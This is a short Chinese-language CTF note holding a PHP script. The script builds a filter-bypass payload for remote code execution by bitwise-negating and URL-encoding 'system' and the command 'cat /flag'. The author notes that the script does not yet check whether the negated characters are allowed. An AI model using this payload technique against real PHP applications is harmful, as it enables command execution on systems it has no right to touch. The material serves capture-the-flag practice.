---
创建: 2025-09-10
tags:
  - CTF/脚本/RCE取反绕过
---

暂时没写对取反后字符是否符合要求的判断逻辑。

```php
<?php
$func = 'system';
$arg = 'cat /flag';
$quote = '"';

echo "(~" . $quote;
echo urlencode(~$func);
echo $quote . ")(~" . $quote;
echo urlencode(~$arg);
echo $quote . ");";
```
